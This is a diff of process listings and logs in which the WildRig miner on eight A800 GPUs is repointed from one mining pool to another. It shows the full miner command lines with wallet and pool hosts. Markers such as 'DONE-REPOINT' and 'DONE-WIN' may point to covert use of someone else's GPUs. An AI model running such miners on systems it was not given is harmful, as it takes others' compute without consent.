+1491307 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g5 --pass x --protocol stratum --opencl-devices 5 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1965
+1491775 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g6 --pass x --protocol stratum --opencl-devices 6 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1966
+1492181 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g0 --pass x --protocol stratum --opencl-devices 0 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1960
+1492207 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g1 --pass x --protocol stratum --opencl-devices 1 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1961
+1492211 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g2 --pass x --protocol stratum --opencl-devices 2 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1962
+1492214 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g7 --pass x --protocol stratum --opencl-devices 7 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1967
+1768989 /root/ul/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g0 --pass x --protocol stratum --opencl-devices 0 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1960
+1769064 /root/ul/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g1 --pass x --protocol stratum --opencl-devices 1 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1961
+1769073 /root/ul/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g2 --pass x --protocol stratum --opencl-devices 2 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1962
+1769557 /root/ul/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g3 --pass x --protocol stratum --opencl-devices 3 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1963
+1770806 /root/ul/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g4 --pass x --protocol stratum --opencl-devices 4 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1964
+1771211 /root/ul/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g5 --pass x --protocol stratum --opencl-devices 5 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1965
+1772023 /root/ul/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g6 --pass x --protocol stratum --opencl-devices 6 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1966
+1772812 /root/ul/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g7 --pass x --protocol stratum --opencl-devices 7 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1967
+### LOGS
 --- g0
-          ##################        
-
-[02:29:44] Initializing GPUs...
-[02:29:45] GPU #0: NVIDIA A800-SXM4-80GB [busID: 32]  [arch: sm80] [driver: 0]
-[02:29:45] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
-[02:29:45] Start mining
---- g1
-          ##################        
-
-[02:29:44] Initializing GPUs...
-[02:29:45] GPU #1: NVIDIA A800-SXM4-80GB [busID: 38]  [arch: sm80] [driver: 0]
-[02:29:45] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
-[02:29:45] Start mining
---- g2
-          ##################        
-
-[02:29:44] Initializing GPUs...
-[02:29:45] GPU #2: NVIDIA A800-SXM4-80GB [busID: 80]  [arch: sm80] [driver: 0]
-[02:29:45] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
-[02:29:45] Start mining
---- g3
- #3 A800-SXM4-80GB               n/a TH/s  38C NaN%  68.2W   nan 1140 1593     -   -   - 
 ----------------------------------------------------------------------------------------
- 10s:                            n/a TH/s Power:     68.2W            Accepted:        -
+ #0 A800-SXM4-80GB               n/a TH/s  48C NaN% 393.9W 0.000 1335 1593     -   -   - 
+----------------------------------------------------------------------------------------
+ 10s:                            n/a TH/s Power:    393.9W            Accepted:        -
  60s:                            n/a TH/s                             Rejected:        -
  15m:                            n/a TH/s                             Ignored:         -
-[0 days 00:00:00]----------------------------------------------------------[ver. 0.52.3]
+[0 days 00:04:09]----------------------------------------------------------[ver. 0.52.3]
+[02:34:14] accepted (1/0)	GPU#0	(304 ms)
+--- g1
+
+[02:33:53] Initializing GPUs...
+[02:33:53] GPU #1: NVIDIA A800-SXM4-80GB [busID: 38]  [arch: sm80] [driver: 0]
+[02:33:53] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
+[02:33:53] Start mining
+[02:33:54] use pool pool.pearlhash.xyz:9000 166.117.41.217
+[02:33:54] new job from pool.pearlhash.xyz:9000
+[02:34:00] putin khuylo! Share accepted (1) 	GPU#1	(306 ms)
+--- g2
+
+[02:33:54] Initializing GPUs...
+[02:33:55] GPU #2: NVIDIA A800-SXM4-80GB [busID: 80]  [arch: sm80] [driver: 0]
+[02:33:55] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
+[02:33:55] Start mining
+[02:33:55] use pool pool.pearlhash.xyz:9000 166.117.41.217
+[02:33:55] new job from pool.pearlhash.xyz:9000
+[02:34:36] accepted (1/0)	GPU#2	(303 ms)
+--- g3
+
+[02:33:56] Initializing GPUs...
+[02:33:56] GPU #3: NVIDIA A800-SXM4-80GB [busID: 85]  [arch: sm80] [driver: 0]
+[02:33:56] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
+[02:33:56] Start mining
+[02:33:57] use pool pool.pearlhash.xyz:9000 166.117.41.217
+[02:33:57] new job from pool.pearlhash.xyz:9000
+[02:34:18] accepted (1/0)	GPU#3	(310 ms)
 --- g4
           ##################        
 
-[02:29:41] Initializing GPUs...
-[02:29:41] GPU #4: NVIDIA A800-SXM4-80GB [busID: 141]  [arch: sm80] [driver: 0]
-[02:29:41] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
-[02:29:41] Start mining
+[02:33:57] Initializing GPUs...
+[02:33:57] GPU #4: NVIDIA A800-SXM4-80GB [busID: 141]  [arch: sm80] [driver: 0]
+[02:33:57] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
+[02:33:57] Start mining
+[02:33:57] use pool pool.pearlhash.xyz:9000 166.117.41.217
+[02:33:57] new job from pool.pearlhash.xyz:9000
 --- g5
           ##################        
 
-[02:29:42] Initializing GPUs...
-[02:29:42] GPU #5: NVIDIA A800-SXM4-80GB [busID: 146]  [arch: sm80] [driver: 0]
-[02:29:42] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
-[02:29:42] Start mining
+[02:33:57] Initializing GPUs...
+[02:33:58] GPU #5: NVIDIA A800-SXM4-80GB [busID: 146]  [arch: sm80] [driver: 0]
+[02:33:58] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
+[02:33:58] Start mining
+[02:33:58] use pool pool.pearlhash.xyz:9000 166.117.41.217
+[02:33:58] new job from pool.pearlhash.xyz:9000
 --- g6
           ##################        
 
-[02:29:43] Initializing GPUs...
-[02:29:43] GPU #6: NVIDIA A800-SXM4-80GB [busID: 201]  [arch: sm80] [driver: 0]
-[02:29:43] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
-[02:29:43] Start mining
+[02:33:59] Initializing GPUs...
+[02:33:59] GPU #6: NVIDIA A800-SXM4-80GB [busID: 201]  [arch: sm80] [driver: 0]
+[02:33:59] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
+[02:33:59] Start mining
+[02:34:00] use pool pool.pearlhash.xyz:9000 35.71.142.47
+[02:34:00] new job from pool.pearlhash.xyz:9000
 --- g7
           ##################        
 
-[02:29:44] Initializing GPUs...
-[02:29:45] GPU #7: NVIDIA A800-SXM4-80GB [busID: 207]  [arch: sm80] [driver: 0]
-[02:29:45] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
-[02:29:45] Start mining
-### DONE-REPOINT
+[02:33:59] Initializing GPUs...
+[02:34:00] GPU #7: NVIDIA A800-SXM4-80GB [busID: 207]  [arch: sm80] [driver: 0]
+[02:34:00] kernel: 1, intensity: 1, cu: 108, memory: 81152Mb
+[02:34:00] Start mining
+[02:34:00] use pool pool.pearlhash.xyz:9000 35.71.142.47
+[02:34:00] new job from pool.pearlhash.xyz:9000
+### POOL-CHECK-FROM-HOST
+ul-t19-123-184-7-135-g7 offline valid= 1306 last_share= 1795538492391 hr30m= 0 agent= krig/1.8.2
+### DONE-WIN
